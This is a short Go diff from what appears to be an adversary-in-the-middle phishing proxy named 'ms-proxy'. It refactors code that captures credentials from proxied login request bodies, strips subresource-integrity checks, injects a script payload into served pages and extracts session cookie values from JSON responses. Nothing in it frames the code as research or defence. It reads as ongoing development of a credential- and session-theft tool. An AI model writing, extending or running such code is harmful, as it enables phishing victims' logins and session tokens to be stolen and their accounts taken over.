@@ -11,6 +11,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	capture "ms-proxy/internal/capture"
 )
 
 // ══════════════════════════════════════════════════════════
@@ -72,7 +74,9 @@ func rewriteRequest(req *http.Request, originalHost, upstream string, target *Ta
 
 		contentType := req.Header.Get("Content-Type")
 
-		captureCredentials(originalHost+req.URL.Path, string(body), contentType, target, session)
+		if target != nil {
+			capture.Credentials(originalHost+req.URL.Path, string(body), contentType, target.Name)
+		}
 
 		bodyStr := patchURLString(string(body), hostMap)
 
@@ -278,7 +282,7 @@ func rewriteResponse(resp *http.Response, originalReq *http.Request, session *Se
 			// the interceptor runs; injectPayload places the script at the end of
 			// <body> (outside the hydrated tree) for the same reason.
 			text = stripIntegrity(text, target.SkipHTMLRewrite)
-			text = injectPayload(text)
+			text = capture.InjectPayload(text)
 			text = restoreFlight(text)
 		}
 
@@ -357,7 +361,6 @@ func extractJSONCookies(body string, session *Session, target *Target) {
 	}
 
 	section := body[idx:]
-
 	for {
 		valIdx := strings.Index(section, `"value":"`)
 		if valIdx == -1 {
